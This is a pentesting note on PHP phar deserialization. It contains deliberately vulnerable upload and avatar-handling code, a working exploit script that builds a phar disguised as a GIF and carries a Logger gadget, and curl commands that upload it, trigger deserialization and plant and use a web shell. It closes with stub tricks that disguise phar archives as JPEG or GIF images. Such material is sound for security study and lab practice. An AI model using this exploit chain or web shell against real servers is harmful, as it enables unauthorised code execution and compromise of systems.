# php-phar

**Author:** Julien Bongars\
**Date:** 2026-02-13 01:36:15\
**Path:**

---

link: https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/phar-deserialization.html

## PHP RFI (Smuggling)

See ./php-phar-rfi-smuggling.md

## PHP deserialisation chain attack

### Source

```php
<?php
// ============================================================
// logger.php - Internal logging class (the gadget)
// ============================================================

class Logger {
    public $logFile;
    public $logData;

    public function __construct($logFile = "/var/log/app/app.log", $logData = "") {
        $this->logFile = $logFile;
        $this->logData = $logData;
    }

    // THE GADGET: __destruct writes to a file using properties
    // that an attacker controls via deserialization.
    public function __destruct() {
        if ($this->logData) {
            file_put_contents($this->logFile, $this->logData . "\n", FILE_APPEND);
        }
    }
}

// ============================================================
// avatar.php - Handles user profile pictures
// ============================================================

class AvatarHandler {
    private $uploadDir = "uploads/avatars/";
    private $maxSize = 2 * 1024 * 1024; // 2MB
    private $allowedMime = ['image/jpeg', 'image/png', 'image/gif'];

    public function upload($file) {
        // --- Validation layer ---
        // Check file size
        if ($file['size'] > $this->maxSize) {
            throw new Exception("File too large.");
        }

        // Check MIME type using file contents (not just extension)
        $finfo = new finfo(FILEINFO_MIME_TYPE);
        $mime = $finfo->file($file['tmp_name']);
        if (!in_array($mime, $this->allowedMime)) {
            throw new Exception("Invalid image type: " . $mime);
        }

        // Check extension
        $allowed_ext = ['jpg', 'jpeg', 'png', 'gif'];
        $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
        if (!in_array($ext, $allowed_ext)) {
            throw new Exception("Invalid extension.");
        }

        // Generate a safe filename
        $filename = bin2hex(random_bytes(16)) . "." . $ext;
        $destination = $this->uploadDir . $filename;
        move_uploaded_file($file['tmp_name'], $destination);

        return $filename;
    }

    public function getSize($filename) {
        // Path is constrained to the uploads directory — no path traversal,
        // no arbitrary file read, no LFI. This looks safe.
        $path = $this->uploadDir . basename($filename);

        if (!file_exists($path)) {
            return null;
        }

        // getimagesize() is used to validate dimensions before rendering.
        // BUT — it supports the phar:// stream wrapper internally.
        // PHP resolves "uploads/avatars/evil.jpg" normally, but if an
        // attacker can make this call process "phar://...", the metadata
        // inside the phar archive gets automatically deserialized.
        //
        // The trick: the $filename parameter comes from a database or
        // user input. If the attacker stored "phar://./uploads/avatars/evil.jpg"
        // as their avatar filename, basename() won't strip the wrapper.
        $size = getimagesize($path);

        if ($size === false) {
            return null;
        }

        return ['width' => $size[0], 'height' => $size[1]];
    }
}

// ============================================================
// index.php - Routes
// ============================================================

require_once('logger.php');
require_once('avatar.php');

$handler = new AvatarHandler();

// Upload endpoint
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['avatar'])) {
    try {
        $filename = $handler->upload($_FILES['avatar']);
        echo json_encode(['success' => true, 'filename' => $filename]);
    } catch (Exception $e) {
        http_response_code(400);
        echo json_encode(['error' => $e->getMessage()]);
    }
}

// Profile endpoint — returns avatar dimensions for front-end rendering
if (isset($_GET['avatar'])) {
    $path = $_GET['avatar'];
    // this is vulnerable!
    $size = getimagesize($path);
    if ($size) {
        echo json_encode($size);
    } else {
        http_response_code(404);
        echo json_encode(['error' => 'Avatar not found']);
    }
}
```

### Attack

Create the phar file

```php
<?php 

class Logger {
    public $logFile;
    public $logData;

    /* Reminder: */
    /* --- */
    /* public function __destruct() { */
    /*     if ($this->logData) { */
    /*         file_put_contents($this->logFile, $this->logData . "\n", FILE_APPEND); */
    /*     } */
    /* } */
}

$pharFile = 'evil.phar';
if (file_exists($pharFile)) {
    unlink($pharFile);
}

// create new Phar
$phar = new Phar($pharFile);
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
$object = new Logger("/var/www/html/shell.php", '<?php system($_GET["cmd"]); ?>');
$phar->setMetadata($object);
$phar->stopBuffering();
```

then we upload phar and trigger in `?avatar`

```bash
mv evil.phar avatar.gif

curl -X POST -F "avatar=@avatar.gif" http://target.com/index.php
# Response: {"success":true,"filename":"a1b2c3d4e5f6...gif"}

# Trigger deserialization — use the filename from the response
curl "http://target.com/index.php?avatar=phar://./uploads/avatars/a1b2c3d4e5f6...gif"

# Hit the webshell
curl "http://target.com/shell.php?cmd=whoami"
```

### Why this needs a phar attack (and simpler attacks fail):

1. Path traversal? Blocked — basename() strips directory components.
2. LFI / RFI? No include() or require() touches user input.
   readfile() isn't used. The file is never executed.
3. Arbitrary file read? The path is pinned to uploads/avatars/.
   You can't read /etc/passwd through getimagesize().
4. Direct PHP upload? Blocked — MIME check uses finfo on actual
   file contents, extension whitelist is enforced, filename is
   randomized. You can't upload a .php file.

BUT: A phar with a GIF89a stub passes both the MIME check
(finfo sees it as image/gif) and the extension check (.gif).
When getimagesize() processes "phar://uploads/avatars/abc123.gif",
it deserializes the metadata — creating a Logger object with
attacker-controlled $logFile and $logData. On garbage collection,
__destruct() fires and writes a webshell to /var/www/html/.

Attack flow:

1. Generate phar with GIF89a stub + Logger in metadata
2. Rename to evil.gif, upload — passes all validation
3. Request ?avatar=phar://./uploads/avatars/<random>.gif
4. getimagesize() triggers deserialization → Logger.__destruct()
   → file_put_contents() writes shell.php
5. Visit /shell.php?cmd=whoami

## PHP PHAR obfuscation

### Set magic jpeg bits

```php
<?php
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
```

### Set magic gif bits

```php
<?php
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
```

### Use a real jpeg

```php
<?php
$jpeg = file_get_contents('legit.jpg');  // any valid JPEG
$phar->setStub($jpeg . "<?php __HALT_COMPILER(); ?>");
```
